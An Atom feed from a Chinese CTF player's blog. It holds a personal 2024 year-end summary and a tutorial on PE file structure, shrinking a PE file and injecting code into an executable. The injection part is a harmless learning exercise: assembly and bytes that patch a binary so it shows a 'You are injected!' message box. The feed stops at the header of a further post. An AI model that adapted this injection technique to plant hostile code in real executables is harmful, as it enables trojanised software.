<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>StarrySky</title>
  
  <subtitle>StarrySky&#39;s zone</subtitle>
  <link href="https://starrysky1004.github.io/atom.xml" rel="self"/>
  
  <link href="https://starrysky1004.github.io/"/>
  <updated>2025-01-02T10:29:32.832Z</updated>
  <id>https://starrysky1004.github.io/</id>
  
  <author>
    <name>StarrySky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/"/>
    <id>https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/</id>
    <published>2025-01-02T08:45:26.000Z</published>
    <updated>2025-01-02T10:29:32.832Z</updated>
    
    <content type="html"><![CDATA[<p>今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实践中学会了awd赛制的打法和批量脚本的编写；在basectf和moectf中学了一个月的web基础；学了半个月kernel基础；跟着z1r0师傅复现了一些cve并且跟着参与了漏洞挖掘实战，学到了IDA动调和windbg动调；年底开始接触RW，目前也就学了一些angr、afl基础用法、IoT基础知识、pe文件结构、压缩注入。这一年的学习过程中很感谢<a href="https://www.cnblogs.com/ve1kcon#/">ve1</a>宝和<a href="https://www.z1r0.top/">z1r0</a>师傅的指导，在我不知道该怎么继续的时候一直是他们在给我鼓励带着我往前。</p><p>这一年也有很多新奇的经历，去了青岛、广州、长沙、上海、北京、贵阳、西安、华山，第一次在网吧过夜，第一次自己一个人坐火车，久违的和妈妈一起去旅游。大学最大的收获除了网安就是长了很多见识，去了很多城市；接任了校队队长之后也学会了团队协作管理，包括在招新的过程中遇到各种各样的人和问题，对于社恐的我来说还挺有挑战性的。年初的时候一时兴起做起了up主，没想到真的有很多人会关注我，现在也有2.4k粉丝啦，也由此认识了一些师傅，在和他们的交流中学到了很多，下半年开始了《重生之我在yctu做pwn手》系列，pwn方向入门感觉挺难的，希望能帮助以后开始学pwn的师傅入门。年初的时候还加入了联队0xFFF，联队的师傅们真的好强啊，对我来说觉得很难很难的比赛很多都是联队的师傅们在出题。</p><p>还有最开心的事就是认识了ve1宝，在香山杯的时候被ve1宝注意到，然后在长城杯第一次面基拍了个合照，以为以后不会有什么交集呢，后来在机缘巧合下又聊了起来，感觉ve1宝真的超级温柔欸，会为我考虑能理解我的感受，而且还是大帅哥，花痴ing（x。再次见面是在上海市赛，和ve1宝在上海玩了一天，外滩那家蟹黄面真好吃aaa，后来ve1宝去北京实习啦，还路过盐城找我玩了几天，大三课少，拼拼凑凑假期多的时候我也去了几次北京，和ve1宝双排打比赛，谁懂啊，有个方向一致志同道合的对象感觉真的超棒！:smirk_cat:后面青岛和贵阳的比赛ve1宝还特地飞来找我玩，一起去看了很多风景。</p><p>2025的计划就是继续学pwn，多接触一些其他知识拓宽知识面，重点放在RW的学习，希望2025能找到一份合适的实习，CTF水平能配得上战队，还有能和我的ve1宝一直好好的欸嘿。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实</summary>
      
    
    
    
    
    <category term="年终总结" scheme="https://starrysky1004.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构与压缩注入</title>
    <link href="https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/"/>
    <id>https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/</id>
    <published>2024-12-16T16:37:42.834Z</published>
    <updated>2024-12-19T08:45:55.857Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE : Portable Executable 可移植的可执行文件，Windows 操作系统下的可执行文件（exe，scr）、动态链接库（dll，oxc，cpl）、驱动程序（sys，vxd）的总称</p><h3 id="DOS头：DOS-Header-DOS-Stub"><a href="#DOS头：DOS-Header-DOS-Stub" class="headerlink" title="DOS头：DOS Header + DOS Stub"></a>DOS头：DOS Header + DOS Stub</h3><p><strong>DOS Header</strong> 结构体（0x40），用于向后兼容早期的 MS-DOS</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE 文件头结构体</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// 标识符，用于确认这是MZ格式的文件，值为0x5A4D</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// 文件中最后一个扇区的字节数</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// 文件中的扇区总数</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// 重定位表中的条目数</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// 文件头的大小，以16字节为单位</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最小额外内存段落数</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最大额外内存段落数</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈段选择子（段地址）</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈指针值</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// 校验和，用于检验文件的完整性</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// 初始指令指针（IP值）</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// 初始代码段选择子（段地址）</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// 文件中重定位表的偏移量</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// 覆盖号，用于实现覆盖功能</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// 保留字段，供未来使用</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM标识符，用于特定于OEM的扩展</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM信息，供OEM使用</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// 保留字段，供未来扩展使用</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// 指向新EXE（PE）头的偏移量，从文件开始处计算</span><span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注：</p><ul><li>e_magic：位于文件首，确认是 MZ 格式文件，对应 ascii 的 MZ </li><li>e_lfanew：PE 头偏移地址，e_lfanew &#x3D; 80，对应 0080h 处</li></ul><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181546947.png" class><p><strong>DOS Stub</strong> 编译器自动生成，由代码和数据混合而成，大小不固定，在不支持 PE 文件格式的操作系统中会显示一个错误提示，在 Windows 中不运行，在 DOS 中会运行</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181643899.png" class><h3 id="PE-头：-NT-头-节表区"><a href="#PE-头：-NT-头-节表区" class="headerlink" title="PE 头： NT 头 + 节表区"></a>PE 头： NT 头 + 节表区</h3><h4 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h4><p>PE 文件的核心部分，包含关于可执行文件的重要信息。开始位置由 e_lfanew 指定</p><p>32位中 NT 结构体 _IMAGE_NT_HEADERS 如下（0xf8）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>    DWORD Signature<span class="token punctuation">;</span>  <span class="token comment">// PE签名，0x4字节</span>    IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span>  <span class="token comment">// PE头，0x14字节</span>    IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// PE可选头</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PE 头结构体 _IMAGE_FILE_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>    WORD Machine<span class="token punctuation">;</span>  <span class="token comment">// 目标机器的类型码，如x86或ARM</span>    WORD NumberOfSections<span class="token punctuation">;</span>  <span class="token comment">// 文件中节(section)的数量</span>    DWORD TimeDateStamp<span class="token punctuation">;</span>  <span class="token comment">// 文件创建或最后修改的时间戳</span>    DWORD PointerToSymbolTable<span class="token punctuation">;</span>  <span class="token comment">// 指向文件中符号表的偏移地址</span>    DWORD NumberOfSymbols<span class="token punctuation">;</span>  <span class="token comment">// 符号表中符号条目的数量</span>    WORD SizeOfOptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// 可选头的大小，用于存储扩展的文件信息</span>    WORD Characteristics<span class="token punctuation">;</span>  <span class="token comment">// 文件特性标志，指DLL、应用程序、可执行文件等</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212182821992.png" class><p>PE 可选头结构体 _IMAGE_OPTIONAL_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span> <span class="token expression"><span class="token number">16</span>  </span><span class="token comment">// 数据目录项数，固定为16</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 标准域</span>    WORD Magic<span class="token punctuation">;</span>  <span class="token comment">// 可选头类型，0x10表示32位，0x20表示64位</span>    BYTE MajorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 主链接器的版本号，以字节为单位</span>    BYTE MinorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 副链接器的版本号，以字节为单位</span>    DWORD SizeOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段大小，以字节为单位</span>    DWORD SizeOfInitializedData<span class="token punctuation">;</span>  <span class="token comment">// 初始化数据段大小，以字节为单位</span>    DWORD SizeOfUninitializedData<span class="token punctuation">;</span>  <span class="token comment">// 未初始化数据段大小，以字节为单位</span>    DWORD AddressOfEntryPoint<span class="token punctuation">;</span>  <span class="token comment">// 程序入口点地址，相对于ImageBase</span>    DWORD BaseOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段起始基址RVA</span>    DWORD BaseOfData<span class="token punctuation">;</span>  <span class="token comment">// 数据段起始基址RVA</span>    <span class="token comment">// NT附加域</span>    DWORD ImageBase<span class="token punctuation">;</span>  <span class="token comment">// 镜像基址，即加载到内存的起始地址</span>    DWORD SectionAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在内存中的对齐大小，以字节为单位</span>    DWORD FileAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在文件中的对齐大小，以字节为单位</span>    WORD MajorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主操作系统版本号</span>    WORD MinorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副操作系统版本号</span>    WORD MajorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 主镜像版本号</span>    WORD MinorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 副镜像版本号</span>    WORD MajorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主子系统版本号</span>    WORD MinorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副子系统版本号</span>    DWORD Win32VersionValue<span class="token punctuation">;</span>  <span class="token comment">// Win32版本值，通常为0</span>    DWORD SizeOfImage<span class="token punctuation">;</span>  <span class="token comment">// 镜像在内存中的大小，以字节为单位</span>    DWORD SizeOfHeaders<span class="token punctuation">;</span>  <span class="token comment">// PE头物理大小，以字节为单位</span>    DWORD CheckSum<span class="token punctuation">;</span>  <span class="token comment">// 校验和，用于验证镜像的完整性</span>    WORD Subsystem<span class="token punctuation">;</span>   <span class="token comment">// 子系统类型</span>    WORD DllCharacteristics<span class="token punctuation">;</span>  <span class="token comment">// DLL特性标志，指示文件是DLL、应用程序等</span>    DWORD SizeOfStackReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为每个线程栈保留的内存大小</span>    DWORD SizeOfStackCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时每个线程栈初始占用的内存大小</span>    DWORD SizeOfHeapReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为进程堆保留的内存大小</span>    DWORD SizeOfHeapCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时进程堆初始占用的内存大小</span>    DWORD LoaderFlags<span class="token punctuation">;</span>  <span class="token comment">// 载入器标志，通常为0</span>    DWORD NumberOfRvaAndSizes<span class="token punctuation">;</span>  <span class="token comment">// 数据目录的项数，固定为IMAGE_NUMBEROF_DIRECTORY_ENTRIES的值</span>    IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 数据目录数组</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212183412327.png" class><h4 id="节表区"><a href="#节表区" class="headerlink" title="节表区"></a>节表区</h4><p>描述 PE 文件各个节的布局和属性，位于 NT 头之后，由一系列 IMAGE_SECTION_HEADER 结构（0x28）构成，每个结构描述一个节，结构排序顺序和描述的节在文件中排序顺序一致。最后以一个空结构结束，所以节表中结构数量为节数量加一</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212184742788.png" class><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185054943.png" class><h3 id="其余特定区域"><a href="#其余特定区域" class="headerlink" title="其余特定区域"></a>其余特定区域</h3><p>text 节、data 节、rsrc 节、数据目录表、导入表、导出表、资源表、重定位表、自定义部分、tls表（线程局部存储表）、加载配置表等</p><p>.relocation 节前 8 字节记录节的 RVA 和<strong>需要进行重定位或修改的条目数量</strong>，每一项都记录了哪些 RVA 地址下的<strong>硬编码寻址</strong>在加载进内存时是需要进行重定位的</p><p>RVA： PE文件的相对虚拟地址（Relative Virual Address）是<strong>PE文件中的数据、模块等运行在内存中的实际地址相对PE文件装载到内存的基址之间的距离</strong></p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class><h3 id="导入表-导出表"><a href="#导入表-导出表" class="headerlink" title="导入表 导出表"></a>导入表 导出表</h3><p><strong>导入表</strong>：存在多个导入表记录每个模块，记录自身使用到的其他模块导出的函数，用于确定调用了哪些模块（dll）的哪些函数，以及确定模块加载进内存后具体函数的地址</p><p>导入表结构体（0x14）如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA) 指向IAT结构</span>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 时间戳.</span>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span>    DWORD   Name<span class="token punctuation">;</span>　　　　　　　　　　　　　　　<span class="token comment">//指向 DLL 名字的 RVA 地址</span>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class> <img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212190805641.png" class><p>结构体成员：</p><ul><li><p>DUMMYUNIONNAME</p><p>用于确定依赖函数的名称，指向 INT （导入名称表）</p></li><li><p>FirstThunk</p><p>指向 IAT 导入地址表，类似 got 表</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/20241208020159-5afedf60-b4c5-1.png" class></li><li><p>Name</p><p>记录一个 RVA 地址，指向依赖的模块的名字</p></li></ul><p><strong>导出表</strong>：只有一个，有子表记录导出符号的地址、名称、序号，需要提供功能的二进制程序（dll）才会有导出表</p><p>包含信息：</p><ul><li>动态链接库提供了什么功能</li><li>向调用者提供输出函数（供使用者调用的函数）在模块中的起始地址</li></ul><p><strong>利用</strong>：通过 dll 名和 dll 导出函数名得到函数地址，也可以通过代码获取：</p><ol><li>通过 Loadlibrary(GetModelHandle) 将 dll 模块映射进内存并返回一个可以被 GetProcAddress 函数使用的句柄</li><li>利用 GetProcAddress 函数获得 dll 的加载地址，然后遍历导出表就可以得到函数地址</li></ol><p>判断导出函数是以序号导出还是以名称导出：</p><p>遍历序号表，判断地址表的下标有没有存在与序号表中，存在就说明是以名称导出，不存在就说明是以序号导出</p><h2 id="PE文件压缩实操总结"><a href="#PE文件压缩实操总结" class="headerlink" title="PE文件压缩实操总结"></a>PE文件压缩实操总结</h2><p>（原理见链接博客</p><p>原程序基址 400000， text 段偏移 1000，rdata 段偏移 2000， data 段偏移 3000</p><h3 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a>删除部分</h3><p>DOS头从头到 e_lfanew（AddressOfNewExeHeader） 保留其余删除， nt 头到 text 段、text 段到 rdata 段之间多余 \x00 删除，rdata 段末尾保留 4 * \x00 截断字符串，截断字符串到 data 段多余的 \x00 删除</p><p>（删除 nt 头到 text 段的全部 \x00 会报WARNING Line 84: 空结构 和 ERROR Line 1367: 声明中的数组大小无效 的错误但是能运行，不过建议最后熟悉了再删不然影响 010 的 exe模板识别后面节表）</p><h3 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a>修改部分</h3><p>DosHeader 中 e_lfanew（AddressOfNewExeHeader） 指向 010 中 pe地址</p><p>NtHeader 中的 OptionalHeader：</p><p>​AddressOfEntryPoint 指向 010 中 text 段地址</p><p>​SectionAlignment 、 FileAlignment 改成 4（最小对齐长度）</p><p>​SectionHeaders 中每个节 VirtualAddress 、PointerToRawData 改成 010 中该节地址，SizeOfRawData 改成该节大小</p><h3 id="按偏移修改部分"><a href="#按偏移修改部分" class="headerlink" title="按偏移修改部分"></a>按偏移修改部分</h3><p>NtHeader -&gt; OptionalHeader -&gt; DataDirArray 中的 Import 和 ImportAddressTable</p><p>text 段、rdata 段、data 段中涉及地址的地方（形如402000 &#x2F; 2000的绝对地址或相对地址，具体看原程序在 ida 中哪里是地址）根据 SectionHeaders 中的地址得到偏移再计算修改后的地址</p><p>例如： Import 原值是 2010，所以属于 rdata 段，基址 2000，偏移 10，rdata 段修改后基址 1f0， 所以 Import 需要修改成 1f0 + 10，注意不要算错</p><h2 id="PE文件注入"><a href="#PE文件注入" class="headerlink" title="PE文件注入"></a>PE文件注入</h2><p>*改之前记得先备份一份</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>弹出窗口用到了<code>MessageBoxA</code>函数，用法如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该函数的二参是弹窗内容，三参是弹窗标题，本文最终目标就是构造出：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"You are injected!"</span><span class="token punctuation">,</span> <span class="token string">"PE injected"</span><span class="token punctuation">,</span> <span class="token number">0x1040u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>弹出标题为 PE injected 内容为 You are injected！，所以总体思路就是先写入标题和内容的字符串，再将参数传递给对应寄存器，最后调用 MessageBoxA 函数</p><h3 id="写入字符串"><a href="#写入字符串" class="headerlink" title="写入字符串"></a>写入字符串</h3><p>向 rdata 段末尾写入 PE injected 和 You are injected!，这里直接用 ida 修改可能会无法保存，需要用 010 editor 写入字符串：先在 ida 中找到 rdata 末尾位置，在 010 editor 中直接搜索字符串 InitializeSListHead 定位到 rdata 段末尾，在后面添加 PE injected 和 You are injected!，再用 ida 打开就能在 rdata 段末尾看到写入的字符串</p><h3 id="确定字符串偏移"><a href="#确定字符串偏移" class="headerlink" title="确定字符串偏移"></a>确定字符串偏移</h3><p>由于程序开了地址随机化，所以不能直接根据地址获取字符串的位置，这里可以参考原程序中字符串是如何获取地址的，例如 19 行的 xmmword_140005820 就是 rdata 段的一个变量</p><p>程序中获取地址的相关代码：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, cs:xmmword_140005820<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接看<code>movdqa  xmm0, cs:xmmword_140005820</code>对应的字节码是<code>66 0F 6F 05 DE 40 00 00</code>，反编译结果如下，也就是使用 rip 加偏移获取的相对地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, xmmword ptr [rip+0x40de]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而这里的 xmmword_140005820 在 ida 中的地址是 0x140005820，上面 010 editor 写入的字符串地址是 0x140006D00，但是由于指令位置不同，同一个变量对应于 rip 的偏移也不同，所以需要结合指令地址去计算字符串的地址，或者直接填一个 rdata 段的地址再根据得到的位置多减少补</p><h3 id="添加-MessageBoxA-函数"><a href="#添加-MessageBoxA-函数" class="headerlink" title="添加 MessageBoxA 函数"></a>添加 MessageBoxA 函数</h3><p>程序中原本是没有 MessageBoxA 函数的，但是在 idata 段有 MessageBoxA 外部函数，所以不能直接通过<code>call MessageBoxA</code>去调用这个函数，需要手动添加<code>MessageBoxA</code>函数，添加内容可以参考<code>exit</code>函数，函数的功能是跳转到 idata 段的对应函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应字节码：<code>FF 25 C8 0D 00 00</code>，同样也是通过 rip 进行相对寻址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp qword ptr [rip + 0xdc8]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以添加 MessageBoxA 函数的方式也类似，需要向 text 段末尾添加跳转函数，这里和添加字符串一样，直接用 ida 添加可能会保存失败，需要先用 010 editor写入一段跳转代码的字节码，添加完成后再用 ida 修改是可以正常保存的，所以偏移不确定可以先随机添加一个地址（参考其他函数中使用的地址确保添加的地址位于 idata 段的范围方便后续计算调试），再用 ida 根据添加的函数地址和 MessageBoxA 的相对位置用 Change Byte 去调整具体地址即可</p><p>最终构造如下函数：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_MessageBoxA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以直接<code>call MessageBoxA</code>调用该函数</p><h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><p>将代码写到开栈操作<code>sub     rsp, 0E0h</code>的后面，否则会堆栈不平衡</p><ul><li><p>将汇编翻译成字节码，这里字符串的相对地址是根据上述方式大致确定的地址，将字节码通过 Change Byte 修改(用 ida 的 assembly 修改会报 Invalid operand</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     r9, 1040hlea     r8, [rip + 0x5662]lea     rdx, [rip + 0x5663]mov     rcx, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到字节码：<code>49 c7 c1 40 10 00 00 4c 8d 05 62 56 00 00 48 8d 15 63 56 00 00 48 c7 c1 00 00 00 00 </code></p></li><li><p>根据得到的字符串位置和实际写入的字符串位置在 ida 中使用 Change Byte 对地址进行微调直到找到正确地址</p></li><li><p>在添加的汇编代码最后使用 ida 的 assemble 添加<code>call MessageBoxA</code></p></li><li><p>按 tab 确认反编译结果是不是<code>MessageBoxA(0LL, &quot;You are injected!&quot;, &quot;PE injected&quot;, 0x1040u);</code></p></li></ul><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241218212918944.png" class><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>还是我ve1宝哒Ovo</p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;PE文件结构&quot;&gt;&lt;a href=&quot;#PE文件结构&quot; class=&quot;headerlink&quot; title=&quot;PE文件结构&quot;&gt;&lt;/a&gt;PE文件结构&lt;/h2&gt;&lt;p&gt;PE : Portable Executable 可移植的可执行文件，Window</summary>
      
    
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/categories/PE/"/>
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>IoT基础知识</title>
    <link href="https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/"/>
    <id>https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/</id>
    <published>2024-12-16T16:29:34.000Z</published>
    <updated>2024-12-16T16:35:06.265Z</updated>
    
